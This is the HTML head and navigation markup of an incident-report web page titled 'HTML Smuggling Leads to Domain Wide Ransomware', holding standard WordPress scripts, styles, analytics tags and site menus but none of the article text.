<!doctype html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<link rel="profile" href="https://gmpg.org/xfn/11">
<title>HTML Smuggling Leads to Domain Wide Ransomware &#8211; The DFIR Report</title>
<meta name="robots" content="max-image-preview:large" />
<link rel="dns-prefetch" href="//stats.wp.com" />
<link rel="dns-prefetch" href="//c0.wp.com" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Feed" href="https://thedfirreport.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="The DFIR Report &raquo; Comments Feed" href="https://thedfirreport.com/comments/feed/" />
<script type="9e52377b4578954d27e7889d-text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/thedfirreport.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<link rel="stylesheet" id="jetpack_related-posts-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/related-posts/related-posts.css" type="text/css" media="all" />
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="https://c0.wp.com/c/6.6.2/wp-includes/css/dist/block-library/style.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css" type="text/css" media="all" />
<link rel="stylesheet" id="wp-mediaelement-css" href="https://c0.wp.com/c/6.6.2/wp-includes/js/mediaelement/wp-mediaelement.min.css" type="text/css" media="all" />
<style id="jetpack-sharing-buttons-style-inline-css" type="text/css">
.jetpack-sharing-buttons__services-list{display:flex;flex-direction:row;flex-wrap:wrap;gap:0;list-style-type:none;margin:5px;padding:0}.jetpack-sharing-buttons__services-list.has-small-icon-size{font-size:12px}.jetpack-sharing-buttons__services-list.has-normal-icon-size{font-size:16px}.jetpack-sharing-buttons__services-list.has-large-icon-size{font-size:24px}.jetpack-sharing-buttons__services-list.has-huge-icon-size{font-size:36px}@media print{.jetpack-sharing-buttons__services-list{display:none!important}}.editor-styles-wrapper .wp-block-jetpack-sharing-buttons{gap:0;padding-inline-start:0}ul.jetpack-sharing-buttons__services-list.has-background{padding:1.25em 2.375em}
</style>
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="stylesheet" id="freenews-style-css" href="https://thedfirreport.com/wp-content/themes/freenews/style.css?ver=6.6.2" type="text/css" media="all" />
<style id="freenews-style-inline-css" type="text/css">
.tags-links, .byline, .comments-link { clip: rect(1px, 1px, 1px, 1px); height: 1px; position: absolute; overflow: hidden; width: 1px; }
</style>
<link rel="stylesheet" id="font-awesome-css" href="https://thedfirreport.com/wp-content/themes/freenews/assets/library/fontawesome/css/all.min.css?ver=6.6.2" type="text/css" media="all" />
<link rel="stylesheet" id="freenews-google-fonts-css" href="https://thedfirreport.com/wp-content/fonts/d92fef3d9e5de6f7993b11046e265436.css" type="text/css" media="all" />
<link rel="stylesheet" id="sharedaddy-css" href="https://c0.wp.com/p/jetpack/13.9.1/modules/sharedaddy/sharing.css" type="text/css" media="all" />
<link rel="stylesheet" id="social-logos-css" href="https://c0.wp.com/p/jetpack/13.9.1/_inc/social-logos/social-logos.min.css" type="text/css" media="all" />
<script type="9e52377b4578954d27e7889d-text/javascript" id="jetpack_related-posts-js-extra">
/* <![CDATA[ */
var related_posts_js_options = {"post_heading":"h4"};
/* ]]> */
</script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/p/jetpack/13.9.1/_inc/build/related-posts/related-posts.min.js" id="jetpack_related-posts-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery.min.js" id="jquery-core-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://c0.wp.com/c/6.6.2/wp-includes/js/jquery/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script type="9e52377b4578954d27e7889d-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/global.js?ver=1" id="freenews-global-js"></script>
<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/20566" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" />
<link rel="shortlink" href="https://thedfirreport.com/?p=20566" />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F08%2F28%2Fhtml-smuggling-leads-to-domain-wide-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://thedfirreport.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fthedfirreport.com%2F2023%2F08%2F28%2Fhtml-smuggling-leads-to-domain-wide-ransomware%2F&#038;format=xml" />

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-162747485-1" type="9e52377b4578954d27e7889d-text/javascript"></script>
<script type="9e52377b4578954d27e7889d-text/javascript">
			window.dataLayer = window.dataLayer || [];
			function gtag(){dataLayer.push(arguments);}
			gtag('js', new Date());
			gtag('config', 'UA-162747485-1');
		</script>
<script type="9e52377b4578954d27e7889d-text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('//thedfirreport.com/?wordfence_lh=1&hid=15503576F6640E1590D50F317BCC9400');
</script> <style>img#wpstats{display:none}</style>
<style type="text/css" id="custom-background-css">
body.custom-background { background-color: #f8f8f8; }
</style>

<meta property="og:type" content="article" />
<meta property="og:title" content="HTML Smuggling Leads to Domain Wide Ransomware" />
<meta property="og:url" content="https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/" />
<meta property="og:description" content="We&#8217;ve previously reported on a Nokoyawa ransomware case in which the initial access was via an Excel macro and IcedID malware. This case, which also ended in Nokoyawa Ransomware, involved the…" />
<meta property="article:published_time" content="2023-08-28T00:22:33+00:00" />
<meta property="article:modified_time" content="2024-05-31T13:20:06+00:00" />
<meta property="og:site_name" content="The DFIR Report" />
<meta property="og:image" content="https://thedfirreport.com/wp-content/uploads/2023/08/18543-001.png" />
<meta property="og:image:width" content="1616" />
<meta property="og:image:height" content="819" />
<meta property="og:image:alt" content />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="HTML Smuggling Leads to Domain Wide Ransomware" />
<meta name="twitter:image" content="https://thedfirreport.com/wp-content/uploads/2023/08/18543-001.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />

<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-32x32.png" sizes="32x32" />
<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-192x192.png" sizes="192x192" />
<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-180x180.png" />
<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/2020/04/cropped-dfir-v1-w-270x270.png" />
</head>
<body class="post-template-default single single-post postid-20566 single-format-standard custom-background has-sidebar tags-hidden author-hidden comment-hidden">
<div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">Skip to content</a>
<header id="masthead" class="site-header">
<div id="main-header" class="main-header">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav class="main-navigation" aria-label="Primary Menu" role="navigation">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li id="menu-item-21337" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li id="menu-item-21314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li id="menu-item-21315" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li id="menu-item-21319" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21318" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31055" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35456" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32606" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38108" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21320" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li id="menu-item-21317" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21325" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21326" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li id="menu-item-31033" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li id="menu-item-21312" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li id="menu-item-21313" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li id="menu-item-21316" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li id="menu-item-21323" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li id="menu-item-21322" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li id="menu-item-31037" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li id="menu-item-35457" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li id="menu-item-32608" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li id="menu-item-38110" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li id="menu-item-21321" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li id="menu-item-21327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li id="menu-item-21328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li id="menu-item-21324" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
<div class="main-header-brand">
<div class="header-brand">
<div class="wrap">
<div class="header-brand-content">
<div class="site-branding">
<div class="site-branding-text">
<p class="site-title"><a href="https://thedfirreport.com/" rel="home">The DFIR Report</a></p>
<p class="site-description">Real Intrusions by Real Attackers, The Truth Behind the Intrusion</p>
</div>
</div>
<div class="header-right">
<div class="header-banner">
</div>
</div>
</div>
</div>
</div>
<div id="nav-sticker">
<div class="navigation-top">
<div class="wrap">
<div id="site-header-menu" class="site-header-menu">
<nav id="site-navigation" class="main-navigation" aria-label="Primary Menu">
<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="toggle-text">Menu</span>
<span class="toggle-bar"></span>
</button>
<ul id="primary-menu" class="menu nav-menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-21337"><a href="https://thedfirreport.com/">Reports</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21314"><a href="https://thedfirreport.com/analysts/">Analysts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21315"><a href="https://thedfirreport.com/services/">Services</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21319"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21318"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31055"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35456"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32606"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38108"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21320"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21317"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21325"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21326"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
</ul>
</li>
<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
